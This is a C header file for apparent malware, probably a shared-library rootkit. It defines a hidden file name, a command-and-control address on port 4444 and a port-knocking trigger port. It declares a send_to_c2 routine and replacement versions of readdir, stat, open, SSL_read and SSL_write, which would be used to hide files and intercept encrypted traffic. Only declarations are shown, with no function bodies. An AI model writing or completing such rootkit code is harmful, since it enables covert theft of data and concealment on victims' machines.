#ifndef MALWARE_H
#define MALWARE_H

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <dirent.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>

// Configuration
#define HIDDEN_FILE "secret_data"
#define C2_IP "192.168.1.100"
#define C2_PORT 4444
#define ACTIVATION_PORT 9999

// Prototypes
int check_knock();
void send_to_c2(const char *data, int length);
struct dirent *readdir(DIR *dir);
int stat(const char *pathname, struct stat *statbuf);
int open(const char *pathname, int flags, ...);
int SSL_read(SSL *ssl, void *buf, int num);
int SSL_write(SSL *ssl, const void *buf, int num);

#endif
